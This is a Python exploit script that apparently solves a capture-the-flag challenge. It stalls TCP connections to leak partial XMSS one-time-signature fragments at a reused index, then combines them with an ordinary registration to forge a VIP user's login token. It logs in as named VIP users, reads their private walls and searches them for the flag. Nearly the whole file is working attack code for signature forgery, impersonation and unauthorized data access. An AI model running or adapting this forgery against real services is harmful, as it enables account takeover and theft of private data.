#!/usr/bin/env python3
"""Recover reused XMSS signature fragments with sequential TCP stalls."""

from __future__ import annotations

import argparse
import os
import re
import socket

from forge_grind_R import SIG_BYTES, forge_vipuser_token
from solve_napasekev2_stall import _TOK, Solver, _drain, _nick

# Reading these users' full walls requires a VIP session.
VIP_TARGETS = [b"kopatych", b"the_beekeeper", b"ded_boyan", b"krugliy", b"vipuser"]

LOWER = 4 + 16 + 288  # 308 bytes = idx || R || wots0
LOWER_HEX = LOWER * 2  # 616
FULL_HEX = SIG_BYTES * 2  # 3368
TOKENLEN = 3400  # 16-char nick -> hex(1684+16)


def login_and_read_vips(sv: Solver, token_hex: str, names):
    """Login with the forged token (as a VIP => can_view_full=1), then peek the FULL
    wall of every seeded VIP. Returns concatenated walls or None if login failed.
    """
    s = socket.create_connection((sv.host, sv.port), timeout=12)
    try:
        _drain(s, b"Invite code: ")
        s.sendall(sv.invite + b"\n")
        _drain(s, b"Enter your choice: ")
        s.sendall(b"L\n")
        _drain(s, b"HoneyPass token: ")
        s.sendall(token_hex.encode() + b"\n")
        d, _ = _drain(s, b"Enter your choice: ", 15)
        if b"Login successful" not in d:
            return None
        out = bytearray(d)
        for nm in names:
            s.sendall(b"P\n")
            _drain(s, b"nickname): ")
            s.sendall(nm + b"\n")
            w, _ = _drain(s, b"Enter your choice: ", 15)
            out += b"\n===== " + nm + b" =====\n" + w
        return bytes(out)
    finally:
        s.close()


def ordinary_register(sv: Solver, nick: str):
    """Plain registration, read the FULL token. Returns raw sm bytes (sig||nick) or None.
    This completes and does the single update (index i->i+1); server stays alive.
    """
    s = socket.create_connection((sv.host, sv.port), timeout=12)
    try:
        _drain(s, b"Invite code: ")
        s.sendall(sv.invite + b"\n")
        _drain(s, b"Enter your choice: ")
        s.sendall(b"R\n" + nick.encode() + b"\n")
        data, _ = _drain(s, b"Enter your choice: ", 12)
    finally:
        s.close()
    m = _TOK.search(data)
    if not m:
        return None
    return bytes.fromhex(m.group(1).decode())  # idx||R||...||nick


def partial_leak(sv: Solver, n_k: int, rcvbuf: int):
    """One stalled registration. Returns dict with kind in {ok, low(=complete), high(=early/rst)}."""
    nick = _nick()
    sc, idx, close, h = sv.stall(n_k, nick, rcvbuf)
    if close == "FIN" and LOWER_HEX <= sc <= TOKENLEN - 1:
        return {
            "kind": "ok",
            "idx": idx,
            "nick": nick,
            "raw308": bytes.fromhex(h[:LOWER_HEX]),
            "sc": sc,
        }
    if sc >= TOKENLEN:  # whole token flushed -> n_k too LOW (advances idx: safe)
        return {"kind": "low", "idx": idx, "sc": sc}
    return {"kind": "high", "idx": idx, "sc": sc}  # block too early / in flood -> n_k too HIGH


def find_nk(sv: Solver, rcvbuf: int, start=1500, tries=22):
    """Binary-search the K-count so the block lands in the wide [616,3399] window.
    sc decreases as n_k rises: complete(sc>=3400) => n_k too low; early/rst(sc<616) => too high.
    """
    lo = hi = None
    nk = start
    for t in range(tries):
        p = partial_leak(sv, nk, rcvbuf)
        print(f"[calib {t}] n_k={nk} sc={p['sc']} kind={p['kind']}", flush=True)
        if p["kind"] == "ok":
            return nk, p
        if p["kind"] == "low":
            lo = nk
            nk = nk * 2 if hi is None else (lo + hi) // 2
        else:
            hi = nk
            nk = max(1, nk // 2) if lo is None else (lo + hi) // 2
        if lo is not None and hi is not None and hi - lo <= 1:
            nk = lo + 1
    return nk, None


def run(a) -> bool:
    sv = Solver(a.host, a.port, a.invite, a.alarm_wait)
    pk = sv.pubkey()
    print(f"[+] pubkey = {pk.hex()}", flush=True)

    nk = a.nk
    first = None
    if nk is None:
        nk, first = find_nk(sv, a.rcvbuf, start=a.nk_start)
        print(f"[+] locked n_k={nk}", flush=True)

    # --- collect partial wots0 leaks (frozen; index unchanged) at ONE index ---
    partials = []
    idx0 = None
    if first:
        partials.append(first)
        idx0 = first["idx"]
    misses = 0
    while len(partials) < a.partial_leaks and misses < a.max_misses:
        p = partial_leak(sv, nk, a.rcvbuf)
        if p["kind"] == "ok":
            if idx0 is None:
                idx0 = p["idx"]
            if p["idx"] != idx0:
                print(
                    f"[!] partial idx moved {idx0}->{p['idx']} (a complete slipped in); "
                    f"resetting group",
                    flush=True,
                )
                partials = [p]
                idx0 = p["idx"]
                continue
            partials.append(p)
            print(
                f"[+] partial {len(partials)}/{a.partial_leaks} idx={p['idx']} sc={p['sc']}",
                flush=True,
            )
        else:
            misses += 1
            if p["kind"] == "low":
                nk += 2
            else:
                nk = max(1, nk - 1)
            print(
                f"[.] miss({p['kind']} sc={p['sc']}) -> n_k={nk} ({misses}/{a.max_misses})",
                flush=True,
            )

    if len(partials) < a.partial_leaks:
        print("[-] could not collect the partial leaks", flush=True)
        return False

    # --- ONE ordinary registration at the SAME index: gives the shared tail + advances idx ---
    nick2 = _nick()
    sig2 = ordinary_register(sv, nick2)
    if not sig2:
        print("[-] ordinary registration failed", flush=True)
        return False
    idx2 = sig2[:4].hex()
    R2 = sig2[4:20]
    if idx2 != idx0:
        print(
            f"[!] ordinary idx {idx2} != partial idx {idx0} — index moved; retry the run",
            flush=True,
        )
        return False
    print(f"[+] ordinary sig at idx={idx2}, len={len(sig2)}", flush=True)

    # verify shared R and reconstruct each partial into a full sm using sig2's tail
    tail = sig2[LOWER:SIG_BYTES]  # auth0 || upper layers (message-independent)
    sigs = [sig2]
    for p in partials:
        if p["raw308"][:4].hex() != idx0 or p["raw308"][4:20] != R2:
            print("[!] partial idx/R mismatch — skipping", flush=True)
            continue
        sm = p["raw308"] + tail + p["nick"].encode()  # idx||R||wots0(userP) || shared tail || nick
        sigs.append(sm)
    if len(sigs) < 2:
        print("[-] not enough consistent observations", flush=True)
        return False
    print(
        f"[+] {len(sigs)} observations at idx={idx0} (1 ordinary + {len(sigs) - 1} partial)",
        flush=True,
    )

    res = forge_vipuser_token(
        pk, sigs, grind_cap=a.grind_cap, target=a.target.encode(), verbose=True
    )
    if not res:
        print("[-] R* grind exhausted; collect one more partial and retry", flush=True)
        return False
    token, _, tr = res
    print(f"[+] forged '{a.target}' token (R* in {tr} tries)", flush=True)
    walls = login_and_read_vips(sv, token.hex(), VIP_TARGETS)
    if not walls:
        print("[-] login failed (VIP session)", flush=True)
        return False
    print("[+] VIP WALLS:\n" + walls.decode(errors="replace"), flush=True)
    m = re.search(rb"avito\{[^}\r\n]+\}", walls)
    if m:
        print("[+] FLAG:", m.group(0).decode(), flush=True)
        return True
    print("[-] logged in as VIP but no avito{...} in the walls", flush=True)
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="napaseke-m9ybjl6b.avitoctf.ru")
    ap.add_argument("--port", type=int, default=32012)
    ap.add_argument(
        "--invite",
        default=os.environ.get("NAPASEKE_INVITE"),
        help="challenge invite code (default: $NAPASEKE_INVITE)",
    )
    ap.add_argument("--alarm-wait", type=float, default=21.0)
    ap.add_argument("--rcvbuf", type=int, default=1250)
    ap.add_argument(
        "--target", default="kopatych", help="VIP username to forge/login as (must be is_vip)"
    )
    ap.add_argument(
        "--partial-leaks", type=int, default=1, help="# of frozen wots0 leaks (+1 ordinary)"
    )
    ap.add_argument("--nk", type=int, default=None, help="skip calibration, use this K-count")
    ap.add_argument("--nk-start", type=int, default=1500)
    ap.add_argument("--max-misses", type=int, default=40)
    ap.add_argument("--grind-cap", type=int, default=200_000_000)
    ap.add_argument("--go", action="store_true")
    a = ap.parse_args()
    if not a.go:
        print("refusing to connect without --go")
        return
    if not a.invite:
        ap.error("--invite or $NAPASEKE_INVITE is required")
    print("SUCCESS" if run(a) else "FAILED", flush=True)


if __name__ == "__main__":
    main()
